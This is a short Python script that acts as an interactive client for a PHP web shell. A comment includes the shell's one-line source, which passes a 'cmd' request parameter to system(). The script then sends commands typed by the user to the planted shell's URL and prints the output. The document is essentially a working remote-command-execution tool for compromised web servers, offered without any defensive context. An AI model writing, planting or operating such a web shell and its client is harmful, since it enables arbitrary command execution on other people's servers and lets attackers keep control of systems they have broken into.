#!/usr/bin/env python

import requests

# pip3 install requests

# contents of shell.php
# <?php echo system($_REQUEST['cmd']);?>

print("URL should be http://xx.xx.xx.xx/shell.php")
url = input("Enter URL of shell: ").strip()

print("Enter command to run")
print("Type 'exit' to exit")

command = ""

while True:
  command = input("cmd: ")
  
  if command == "exit": 
    exit()
  
  else:
    request_string = url + "?cmd=" + command + ";echo"
    print("Trying: " + request_string)
    
    try:
      r = requests.get(request_string)
      print(r.text)
  
    except:
      print("could not reach server")
